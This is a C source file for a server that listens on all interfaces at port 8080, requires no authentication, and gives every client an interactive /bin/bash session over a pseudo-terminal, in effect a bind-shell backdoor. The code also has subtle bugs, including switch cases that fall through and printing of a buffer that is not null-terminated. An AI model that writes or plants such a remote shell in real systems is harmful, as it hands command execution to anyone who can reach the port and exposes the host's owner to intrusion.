#include <stdio.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <pty.h>
#include <poll.h>

constexpr char HOSTNAME[] = "0.0.0.0";
constexpr char PORT[] = "8080";

void talk_socket_pty(int masterFd, int cfd) {
    char buf[1024];
    ssize_t numRead;
    struct pollfd pfds[2] = {
        {masterFd, POLLIN, 0},
        {cfd, POLLIN, 0}
    };
        while (poll(pfds, 2,30000) > 0) {
            if (pfds[1].revents & POLLIN) {
                if ((numRead  = read(cfd, buf, sizeof(buf)))  > 0) {
                    if (numRead < 0) {
                        break;
                    }
                    printf("%s", buf);
                    write(masterFd, buf, numRead);
                }
            }
            if (pfds[0].revents & POLLIN) {
                if ((numRead = read(masterFd, buf, sizeof(buf))) > 0) {
                    if (numRead < 0) {
                        break;
                    }
                    write(cfd, buf, numRead);
                }
            }
        }
}

void handleRequest(int cfd) {
    char name[64];
    int masterFd;
    char* argv[] = {"/bin/bash",NULL};
    pid_t pid= forkpty(&masterFd, name, NULL, NULL);
    switch (pid) {
        case -1:
            perror("forkpty");
        case 0:
            execve("/bin/bash",argv,NULL);
        default:
            talk_socket_pty(masterFd,cfd);
            break;
    }
    close(cfd);
}

void reapChildren(int sig) {
    while (waitpid(-1, NULL, WNOHANG) > 0);
}
int createConnection(const char hostname[], const char port[]) {
    struct addrinfo * addresses, * adress;
    struct addrinfo hints = {0};
    int lfd;

    hints.ai_canonname = NULL;
    hints.ai_addr = NULL;
    hints.ai_next = NULL;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;
    hints.ai_flags = AI_PASSIVE | AI_NUMERICSERV;

    int err = getaddrinfo(hostname, port,&hints, &addresses);
    if (err != 0) {
        printf("getaddrinfo error: %s\n", gai_strerror(err));
    }
    int optval = 1;
    for (adress = addresses; adress != NULL;adress=adress->ai_next) {
        if ((lfd = socket(adress->ai_family, adress->ai_socktype,adress->ai_protocol)) == -1) {
            continue;
        }
        if (setsockopt(lfd,SOL_SOCKET, SO_REUSEADDR,&optval, sizeof(optval)) == -1) {
            perror("setsockopt");
        }
        if (bind(lfd,adress->ai_addr,adress->ai_addrlen) == 0) {
            break;
        }
    }
    if (listen(lfd,5) == -1) {
        perror("listen");
    }
    freeaddrinfo(addresses);
    return lfd;
}
int main(void) {
    int cfd;
    int lfd = createConnection(HOSTNAME, PORT);
    signal(SIGCHLD, reapChildren);
    while (1) {
        if ((cfd = accept(lfd,NULL,NULL)) == -1) {
            perror("accept");
        }
        switch (fork()) {
            case -1:
                perror("fork");
            case 0:
                handleRequest(cfd);
                return 0;
            default:
                close(cfd);
                break;
        }
    }
}